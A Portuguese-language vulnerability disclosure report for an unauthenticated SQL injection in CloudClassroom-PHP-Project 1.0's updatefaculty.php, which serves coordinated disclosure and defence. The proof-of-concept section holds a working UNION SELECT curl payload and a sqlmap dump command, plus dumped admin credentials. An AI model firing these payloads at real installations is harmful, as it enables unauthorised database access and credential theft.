# Vulnerability Report (formato NIST/NVD) — CloudClassroom-PHP-Project 1.0 — SQL Injection em updatefaculty.php (parâmetro fid)

*Estruturado conforme convenções NIST SP 800-51 / NVD (CVE + CWE + CVSS v3.1 + CPE).*

## 1. Vulnerability Identification
- **Internal ID:** CC-2026-04
- **Proposed CVE:** (pendente de atribuição)
- **Report date:** 2026-08-02
- **Reporter:** oliveira.luanalmeida@gmail.com e ethical.hacker.tiagoredivo@gmail.com .

## 2. Vulnerability Summary
O parâmetro `fid` é interpolado sem aspas (numérico) na consulta SELECT. Em contexto numérico é possível `UNION SELECT`. A tabela consultada expõe 9 colunas. Confirmado com dump não-autenticado das credenciais de admin.

## 3. Weakness Enumeration (CWE)
- CWE-89: SQL Injection

## 4. Affected Products (CPE 2.3)
- `cpe:2.3:a:vishalmathur:cloudclassroom-php_project:1.0:*:*:*:*:*:*:*`
- Vendor: Vishal Mathur · Product: CloudClassroom-PHP-Project · Version: 1.0
- Affected file(s): `updatefaculty.php`

## 5. Impact Metrics — CVSS v3.1
- **Base Score:** 9.1 (Crítico)
- **Vector String:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

| Métrica | Valor |
|---|---|
| Attack Vector (AV) | Network (N) |
| Attack Complexity (AC) | Low (L) |
| Privileges Required (PR) | None (N) |
| User Interaction (UI) | None (N) |
| Scope (S) | Unchanged (U) |
| Confidentiality (C) | High (H) |
| Integrity (I) | High (H) |
| Availability (A) | None (N) |

- **EPSS:** N/A (sem CVE) — estimativa baixa (~0,03–0,09).

## 6. Technical Description
O parâmetro `fid` é interpolado sem aspas (numérico) na consulta SELECT. Em contexto numérico é possível `UNION SELECT`. A tabela consultada expõe 9 colunas. Confirmado com dump não-autenticado das credenciais de admin.

Causa-raiz:

**`updatefaculty.php`**

```php
$x=$_GET['fid'];
$sql="select * from <tabela> WHERE <col>=$x";
$rs=mysqli_query($connect,$sql);
```

## 7. Attack Steps / Proof of Concept
1. Requisitar `updatefaculty.php` com `fid` contendo o payload UNION (sem cookie — item 00).
2. Ajustar a contagem de colunas para 9 (tabela alvo) e posicionar os dados na coluna exibida.
3. Ler as credenciais de admin refletidas na resposta.
4. Automatizar com sqlmap (`-p fid`) para dump completo.

```bash
curl -s -G "http://127.0.0.1:9292/updatefaculty.php" \
  --data-urlencode "fid=0 UNION SELECT 1,concat(0x5b,Aid,0x3a,Apass,0x5d),3,4,5,6,7,8,9 FROM admin -- -" | grep -oE "\[[^]]*:[^]]*\]"

sqlmap -u "http://127.0.0.1:9292/updatefaculty.php?fid=1" -p fid --batch --dump -T admin
```

Evidence:
```
[admin@ics.com:admin]
[vishu:vishu]
```

## 8. Impact Analysis
Leitura arbitrária do banco (C:H) — PII, senhas em texto puro, credenciais de admin; escrita via o sink UPDATE/POST (I:H); comprometimento total em cadeia.

## 9. Recommended Mitigations
- Usar prepared statements com bind de parâmetros (`mysqli`/PDO) em 100% das consultas.
- Forçar o tipo dos identificadores numéricos (`(int)$id`) e usar allowlist quando aplicável.
- Não ecoar `$sql`/`mysqli_error()` ao cliente (remover oráculo de erro).
- Aplicar `exit;` após o guard de sessão (ver item 00).

## 10. References
- https://cwe.mitre.org/
- https://www.first.org/cvss/calculator/3.1
- https://cvefeed.io/vuln/product/161371/vishalmathurcloudclassroom-php_project/

## 11. Disclosure Timeline
- 2026-08-02: Discovery and lab confirmation.
- 2026-08-02: Report drafted; coordinated disclosure initiated.
